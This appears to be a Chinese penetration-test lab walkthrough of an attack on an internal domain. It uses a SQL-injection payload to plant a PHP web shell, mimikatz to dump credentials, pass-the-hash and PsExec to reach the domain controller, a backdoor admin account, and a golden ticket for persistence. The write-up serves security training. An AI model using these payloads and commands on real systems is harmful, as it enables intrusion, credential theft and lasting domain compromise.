## SQL注入拿shell

构造payload：and 1=1显示正确，and 1=2显示错误，说明存在SQL注入，并且爆出绝对路径

![](../Images/903eb7a460211ae1d1e48b227493e318.png)

  

使用常用的注入函数into outfile 将一句话木马写入自动创建的 xxx.php文件中

```
http://xxx.xxx.xxx/?id=1 and 1=2 union select 1,'<?php @eval($\_REQUEST\[xxx\]);?>' into outfile 'x:\\\\xxx\\\\xxx\\\\xxx.php'

```

需要有写入权限和上一步爆出的绝对路径

![](../Images/0afc5feb06cfa3b560d780df8125c776.png)

  

验证上传的木马是否成功，成功写入木马

```
http://xxx.xxx.xxx/xxx.php?xxx=phpinfo();
```

![](../Images/f822dc1270be0bc15426d277459e34f7.png)

成功利用蚁剑拿到shell

再使用上述管理员账号密码远程连接10.0.1.8

![](../Images/62cfa0ef96b1221f1cd5f220560db2c9.png)

成功连接

![](../Images/2df2c8fac33e298074218a711ff420bb.png)

## 拿下域控

将mimikatz添加到桌面并以管理员权限运行  
privilege::debug 提升权限  
log 日志会记录内容  
sekurlsa::logonpasswords 抓取密码

![](../Images/9da735ba61369eac90f1dbfc2fcac881.png)

获取

```
user=administrator
Domain=xxx
NTLM=xxxxxxx

```

将上述值放入下方命令中，完成哈希传递，以后利用这个CMD窗口运行,拥有管理员权限。

```
sekurlsa::pth /user:administrator /domain:"xx.xx"
/ntlm:xxxxxxx

```

启动域控主机cmd窗口，成功访问域控主机C盘  
dir \\DC.xx.xx\\c$

![](../Images/d9f2d084d59974b3492fc6f64a9a094e.png)

使用官方工具PsExec.exe，命令如下：  
PsExec.exe \\dc.xx.xx cmd  
进入c:\\  
输入ipconfig， 10.0.1.6为域控ip，此时成功获取域控cmd

![](../Images/bd5e5011b4da8cc120d6bdf4fcb5fd7c.png)

新建账号，直接远程登陆域控主机

```
"net user xxx xxxx /add" //新增账号和对应密码
"net localgroup administrators xxxx /add"//提升新增账号的权限至administrators组
```

![](../Images/4ac88197a55b2e090e1e887c9fc99ca7.png)

建好账号后，直接登陆域控主机10.0.1.6(DC.xx.xx)，成功拿下域控主机权限

![](../Images/5c76a4082c22386dc50e7eb74f909a91.png)

至此已成功拿下三台主机的权限。

![](../Images/a7d056fba3a4bb819fbd3985e35e6e34.png)

## 权限维持

可通过制作黄金票据进行权限维持  
因为域控主机10.0.1.6安装了补丁KB2871997，所以无法抓取到明文密码  
管理员运行猕猴桃  
log 日志记录内容  
lsadump::dcsync /user:krbtgt 获取内容

![](../Images/7c342b7166865260a93c06479570f795.png)

获取krbtgt账号的关键值（OSID和Hash\_NTLM）

![](../Images/dfe1961c702e2ed72cfc150478d0e9e2.png)

制作黄金票据

```
kerberos::golden /admin:administrator /domain:xx.xx /sid:xx-xx-xx /krbtgt:xxxxxx /ticket:xxx.kiribi

```

如图

![](../Images/9be42a08bf68d64e9735c8221a012477.png)

票据加载成功

![](../Images/1972d24ac6d85f06a25e5c191959b72f.png)

普通窗口无法访问域控根目录

![](../Images/02799035f8103c12c81dfe5adf388d3c.png)

把域控中的票据复制到在10.0.1.8主机中，使用猕猴桃加载票据  
kerberos::ptt xxx.kiribi 加载票据

  

![](../Images/a888d3c975676df15aba7402d5f9d1a2.png)

  

然后成功在普通cmd中访问域控c盘内容  
dir \\DC.xx.xx\\c$

  

![](../Images/d9b901377a6c4c79e33ccc4c60a2bac5.png)

  

PExec.exe \\DC.xx.xx cmd 获取域控cmd

![](../Images/31545a20af2b89173dd9c85fc5af487d.png)
